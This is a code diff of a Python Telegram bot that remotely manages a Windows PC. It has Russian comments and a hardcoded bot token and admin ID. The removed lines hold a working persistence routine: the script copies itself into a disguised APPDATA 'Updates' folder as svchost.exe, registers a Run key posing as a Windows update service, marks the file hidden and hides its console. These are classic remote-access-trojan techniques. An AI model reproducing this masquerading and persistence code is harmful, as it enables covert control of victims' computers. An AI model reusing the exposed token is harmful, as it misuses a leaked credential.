@@ -7,18 +7,12 @@ import getpass
 import platform
 import socket
 import uuid
-import shutil
-import subprocess
 from threading import Thread
 
 # ========== ТВОИ ДАННЫЕ ==========
 BOT_TOKEN = '8689333512:AAE1XY-yWka5xvyN-IIgnH5cy47eB_ug5xU'
 ADMIN_ID = 8527578981
 # ================================
-
-# Пути для маскировки
-HIDDEN_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates')
-PROCESS_NAME = "svchost.exe"
 
 class PCManager:
     def __init__(self):
@@ -54,32 +48,6 @@ class PCManager:
 pc = PCManager()
 bot = telebot.TeleBot(BOT_TOKEN)
 
-def add_to_startup():
-    try:
-        if not os.path.exists(HIDDEN_FOLDER):
-            os.makedirs(HIDDEN_FOLDER)
-        
-        current_file = os.path.abspath(sys.argv[0])
-        hidden_file = os.path.join(HIDDEN_FOLDER, PROCESS_NAME)
-        
-        if current_file != hidden_file:
-            shutil.copy2(current_file, hidden_file)
-        
-        import winreg
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-            winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{hidden_file}"')
-        
-        subprocess.run(f'attrib +h "{hidden_file}"', shell=True)
-        
-        with open(os.path.join(HIDDEN_FOLDER, '.installed'), 'w') as f:
-            f.write('installed')
-        return True
-    except:
-        return False
-
 def send_startup_notification():
     time.sleep(5)
     try:
@@ -96,8 +64,8 @@ def send_startup_notification():
 ━━━━━━━━━━━━━━━━━━━
         """
         bot.send_message(ADMIN_ID, message)
-    except:
-        pass
+    except Exception as e:
+        print(f"Ошибка отправки: {e}")
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -131,7 +99,7 @@ def shutdown(message):
         if platform.system() == "Windows":
             os.system("shutdown /s /t 10")
         else:
-            os.system("shutdown -h now")
+            bot.send_message(message.chat.id, "❌ Команда выключения работает только на Windows")
 
 @bot.message_handler(func=lambda m: m.text == '🔄 Перезагрузить')
 def restart(message):
@@ -141,23 +109,17 @@ def restart(message):
         if platform.system() == "Windows":
             os.system("shutdown /r /t 10")
         else:
-            os.system("shutdown -r now")
+            bot.send_message(message.chat.id, "❌ Команда перезагрузки работает только на Windows")
 
 def main():
-    if platform.system() == "Windows":
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    
-    marker = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates', '.installed')
-    if not os.path.exists(marker):
-        add_to_startup()
-    
+    print("Бот запущен...")
     Thread(target=send_startup_notification).start()
     
     while True:
         try:
             bot.polling(non_stop=True, interval=0)
         except Exception as e:
+            print(f"Ошибка: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
